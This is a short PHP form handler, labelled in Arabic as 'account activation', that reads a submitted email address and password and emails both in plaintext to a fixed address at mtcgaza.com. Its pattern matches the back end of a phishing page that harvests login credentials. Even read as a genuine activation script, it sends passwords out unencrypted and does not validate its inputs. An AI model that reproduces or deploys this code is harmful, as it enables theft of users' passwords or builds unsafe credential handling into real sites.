<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    
    $to = "support@mtcgaza.com";
    $subject = "تفعيل الحساب";
    $message = "البريد الإلكتروني: $email\nكلمة المرور: $password";

    $headers = "From: no-reply@mtcgaza.com\r\n";

    if (mail($to, $subject, $message, $headers)) {
        echo "تم إرسال بيانات التفعيل بنجاح!";
    } else {
        echo "حدث خطأ أثناء إرسال البيانات.";
    }
}
?>
